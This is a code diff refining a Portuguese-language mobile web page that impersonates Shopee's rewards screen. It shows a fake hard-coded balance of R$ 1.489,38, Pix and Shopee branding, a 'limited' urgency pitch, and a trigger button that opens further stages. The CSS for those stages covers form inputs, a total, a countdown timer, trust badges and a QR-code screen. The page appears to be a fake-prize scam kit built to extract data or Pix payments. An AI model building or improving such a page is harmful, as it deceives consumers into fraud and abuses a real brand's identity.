@@ -9,9 +9,9 @@
     <style>
         :root {
             --orange: #ee4d2d;
-            --gray-bg: #eef1f3;
-            --text-dark: #222;
-            --green-tag: #e6f7f1;
+            --bg-gray: #e5e5e5;
+            --card-white: #ffffff;
+            --text-black: #000000;
             --green-text: #00bfa5;
         }
 
@@ -19,18 +19,17 @@
 
         body {
             font-family: 'Roboto', sans-serif;
-            background: #e5e5e5;
+            background: var(--bg-gray);
             margin: 0;
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            overflow-x: hidden;
         }
 
         .app-container {
             width: 100%;
             max-width: 480px;
-            background: #f7f7f7; /* Fundo cinza claro da imagem */
+            background: #f1f1f1; /* Fundo exato da imagem */
             min-height: 100vh;
             position: relative;
             overflow: hidden;
@@ -38,65 +37,169 @@
             flex-direction: column;
         }
 
-        /* --- ETAPA 1: DASHBOARD DETALHADO --- */
-        .header-stage1 { padding: 25px 20px 15px; text-align: center; font-weight: 700; font-size: 19px; color: #000; }
+        /* --- FASE 1: DASHBOARD (FIDELIDADE 100%) --- */
         
+        /* Título fora do card */
+        .page-title {
+            text-align: center;
+            font-weight: 800;
+            font-size: 18px;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            color: black;
+        }
+
+        /* CARD LARANJA */
         .balance-card {
-            background: var(--orange); margin: 0 15px 20px; border-radius: 15px; padding: 25px 20px; color: white;
-            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.2); position: relative; overflow: hidden;
+            background: var(--orange);
+            margin: 0 15px 20px;
+            border-radius: 12px;
+            padding: 20px;
+            color: white;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(238, 77, 45, 0.2);
         }
-        .balance-card .val { font-size: 34px; font-weight: 800; margin: 5px 0; }
-        .balance-card .points { font-size: 13px; opacity: 0.9; }
-        .balance-card .last-bonus { 
-            margin-top: 15px; font-size: 12px; padding-top: 12px; 
-            border-top: 1px dashed rgba(255,255,255,0.4); 
-        }
-        .coin-img { position: absolute; right: 20px; top: 25px; width: 55px; opacity: 0.9; }
-
-        /* SEÇÃO SACAR DINHEIRO (CORRIGIDA E DETALHADA) */
-        .withdraw-white-card {
-            background: white; margin: 0 15px 15px; border-radius: 12px; padding: 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-        }
-        .withdraw-white-card h4 { margin: 0 0 15px; font-size: 16px; color: #333; }
+        .balance-label { font-size: 14px; margin-bottom: 5px; font-weight: 400; }
+        .balance-value { font-size: 36px; font-weight: 900; letter-spacing: -1px; }
+        .balance-points { font-size: 13px; opacity: 0.9; margin-bottom: 15px; }
         
-        .pix-tag { 
-            display: flex; align-items: center; gap: 6px; font-size: 13px; color: #888; margin-bottom: 20px;
+        .divider-dashed {
+            border-top: 1px dashed rgba(255,255,255,0.5);
+            margin-bottom: 12px;
         }
-        .pix-logo-icon { height: 14px; filter: grayscale(100%); opacity: 0.6; }
-
-        .grid-vals { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .val-btn { background: #f2f3f5; padding: 12px; border-radius: 6px; text-align: center; font-weight: 700; color: #444; font-size: 14px; }
-
-        /* BOTÃO GATILHO (VALOR TOTAL) */
-        .btn-main-withdraw {
-            background: #f2f3f5; width: 100%; padding: 18px; border-radius: 8px; text-align: center;
-            font-size: 24px; font-weight: 800; color: #222; margin-bottom: 10px; cursor: pointer;
-            border: 2px solid transparent; transition: 0.2s;
+        
+        .last-bonus { 
+            font-size: 13px; 
+            font-weight: 500;
         }
-        .btn-main-withdraw:active { border-color: var(--orange); background: #fff5f1; }
 
-        /* BOTÃO INATIVO */
-        .btn-inactive { background: #f9f9f9; color: #ccc; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: 700; font-size: 15px; cursor: not-allowed; }
-
-        .legal-text { font-size: 11px; color: #999; text-align: center; line-height: 1.4; padding: 0 10px; margin-top: 20px; }
-
-        /* BANNER ACESSO EXCLUSIVO */
-        .exclusive-banner {
-            background: white; margin: 0 15px 25px; border-radius: 12px; padding: 20px;
-            display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        .coin-icon {
+            position: absolute;
+            top: 25px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background: #fdd835; /* Ouro */
+            border: 3px solid #fbc02d;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #f57f17;
+            font-size: 28px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
         }
-        .exclusive-banner .text-cont h4 { margin: 0 0 5px; font-size: 15px; color: #000; }
-        .exclusive-banner .text-cont p { margin: 0; font-size: 11px; color: #666; line-height: 1.4; }
-        .shopee-bag { width: 60px; flex-shrink: 0; }
+        .coin-icon::after { content: '$'; }
 
-        /* --- ESTILOS ETAPAS 2 E 3 --- */
+        /* CARD BRANCO "SACAR DINHEIRO" */
+        .white-card {
+            background: var(--card-white);
+            margin: 0 15px 15px;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .card-title {
+            font-size: 16px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: black;
+        }
+
+        .payment-method {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 20px;
+        }
+        .card-icon { width: 18px; opacity: 0.5; }
+        .pix-logo { height: 14px; opacity: 0.6; }
+
+        /* BOTÕES DE VALOR */
+        .grid-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .small-btn {
+            background: #f0f2f5;
+            padding: 12px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 15px;
+            color: #000;
+        }
+
+        /* BOTÃO GRANDE (ACIONÁVEL) */
+        .big-btn {
+            background: #f0f2f5;
+            width: 100%;
+            padding: 16px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 800;
+            color: #000;
+            margin-bottom: 10px;
+            cursor: pointer; /* Gatilho */
+            border: 2px solid transparent;
+            transition: 0.2s;
+        }
+        .big-btn:active {
+            border-color: var(--orange);
+            background: #fff5f1;
+        }
+
+        /* BOTÃO "SACAR DINHEIRO" (VISUAL DESATIVADO) */
+        .disabled-btn {
+            background: #f7f7f7;
+            width: 100%;
+            padding: 14px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 700;
+            color: #e0e0e0; /* Texto bem claro como na imagem */
+            border: none;
+            margin-bottom: 20px;
+        }
+
+        .legal-text {
+            font-size: 11px;
+            color: #9e9e9e;
+            text-align: center;
+            line-height: 1.4;
+            padding: 0 5px;
+        }
+
+        /* CARD "OBTENHA SEU ACESSO" */
+        .access-card {
+            background: var(--card-white);
+            margin: 0 15px 30px;
+            border-radius: 12px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .access-text h4 { margin: 0 0 5px; font-size: 15px; font-weight: 800; color: black; }
+        .access-text p { margin: 0; font-size: 10px; color: #666; line-height: 1.3; text-align: justify; }
+        .bag-icon { width: 55px; height: auto; border-radius: 8px; }
+
+
+        /* --- OUTRAS FASES (MANTIDAS) --- */
         .overlay-blur { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); z-index: 90; opacity: 0; pointer-events: none; transition: 0.4s; }
         .overlay-blur.active { opacity: 1; pointer-events: all; }
 
         .bottom-sheet { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(110%); width: 100%; max-width: 480px; background: white; border-top-left-radius: 20px; border-top-right-radius: 20px; padding: 25px; box-shadow: 0 -5px 25px rgba(0,0,0,0.15); z-index: 100; transition: 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
         .bottom-sheet.active { transform: translateX(-50%) translateY(0); }
-        
         .input-group { margin-bottom: 20px; }
         .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #333; }
         .input-form { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; -webkit-appearance: none; }
@@ -105,7 +208,6 @@
 
         .full-screen-page { position: fixed; top: 0; left: 50%; transform: translateX(-50%) translateY(100%); width: 100%; max-width: 480px; height: 100%; background: #eef1f3; z-index: 200; overflow-y: auto; transition: 0.4s ease-out; padding: 15px; padding-bottom: 40px; display: flex; flex-direction: column; }
         .full-screen-page.active { transform: translateX(-50%) translateY(0); }
-
         .shopee-top-logo { text-align: center; margin-bottom: 15px; margin-top: 10px; flex-shrink: 0; }
         .shopee-top-logo img { height: 35px; }
         .main-card { background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); overflow: hidden; margin-bottom: 20px; flex-shrink: 0; }
@@ -125,7 +227,6 @@
         .d-value { font-weight: 600; color: #222; text-align: right; }
         .total-row { display: flex; justify-content: space-between; padding-top: 15px; align-items: center; }
         .total-val { font-size: 18px; font-weight: 800; color: #222; }
-        
         .process-box { background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); flex-shrink: 0; }
         .process-title { font-size: 13px; font-weight: 700; color: #444; margin-bottom: 15px; text-transform: uppercase; }
         .step-item { display: flex; gap: 15px; margin-bottom: 20px; }
@@ -135,11 +236,8 @@
         .step-content div:last-child { font-size: 12px; color: #777; }
         .btn-final-red { background: #f53d2d; color: white; width: 100%; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer; box-shadow: 0 4px 10px rgba(245, 61, 45, 0.2); }
         .timer-txt { text-align: center; font-size: 12px; color: var(--green-text); margin-top: 10px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px; }
-        
-        /* LOGOS INSTITUCIONAIS (APENAS NA FASE 3) */
         .trust-badges-row { display: flex; justify-content: center; gap: 20px; margin-top: 25px; opacity: 0.8; }
         .trust-txt { font-weight: bold; font-size: 13px; color: #555; }
-
         #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 300; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
     </style>
 </head>
@@ -148,49 +246,54 @@
     <div class="app-container">
         
         <div id="stage-1" style="overflow-y: auto;">
-            <div class="header-stage1">Resgatar recompensas</div>
+            <div class="page-title">Resgatar recompensas</div>
             
             <div class="balance-card">
-                <div style="font-size: 13px;">Seu saldo</div>
-                <div class="val">R$ 1.489,38</div>
-                <div class="points">= 42.583,05 pontos (s)</div>
-                <div class="last-bonus">Última bonificação apresentada: R$ 845,24</div>
-                <img src="https://cdn-icons-png.flaticon.com/512/189/189715.png" class="coin-img">
+                <div class="balance-label">Seu saldo</div>
+                <div class="balance-value">R$ 1.489,38</div>
+                <div class="balance-points">= 42.583,05 pontos (s)</div>
+                
+                <div class="divider-dashed"></div>
+                
+                <div class="last-bonus">Última bonificação apresentada : R$ 845,24</div>
+                <div class="coin-icon"></div>
             </div>
 
-            <div class="withdraw-white-card">
-                <h4>Sacar dinheiro</h4>
+            <div class="white-card">
+                <div class="card-title">Sacar dinheiro</div>
                 
-                <div class="pix-tag">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_bcb.svg" class="pix-logo-icon">
-                    Transferência via / Pix
+                <div class="payment-method">
+                    <svg class="card-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    Transferencia via / 
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo%E2%80%94pix_powered_by_bcb.svg" class="pix-logo">
                 </div>
 
-                <div class="grid-vals">
-                    <div class="val-btn">R$1,5</div>
-                    <div class="val-btn">R$5</div>
-                    <div class="val-btn">R$10</div>
+                <div class="grid-buttons">
+                    <div class="small-btn">R$1,5</div>
+                    <div class="small-btn">R$5</div>
+                    <div class="small-btn">R$10</div>
                 </div>
 
-                <div class="btn-main-withdraw" onclick="abrirEtapa2()">R$ 1.489,38</div>
+                <div class="big-btn" onclick="abrirEtapa2()">R$ 1.489,38</div>
                 
-                <button class="btn-inactive">Sacar dinheiro</button>
+                <button class="disabled-btn">Sacar dinheiro</button>
 
                 <p class="legal-text">
                     Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
                 </p>
             </div>
 
-            <div class="exclusive-banner">
-                <div class="text-cont">
+            <div class="access-card">
+                <div class="access-text">
                     <h4>Obtenha seu acesso exclusivo</h4>
-                    <p>Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações.</p>
+                    <p>Descubra todos os benefícios liberados especialmente para você. Ao concluir o acesso, você poderá aproveitar as vantagens disponíveis de forma rápida, segura e sem complicações. Não perca a oportunidade de garantir algo que é limitado e pensado para quem chegou até aqui.</p>
                 </div>
-                <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" class="shopee-bag">
+                <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" class="bag-icon">
             </div>
-            
-            <div style="height: 30px;"></div>
+
+            <div style="height: 20px;"></div>
         </div>
+
 
         <div class="overlay-blur" id="overlay"></div>
 
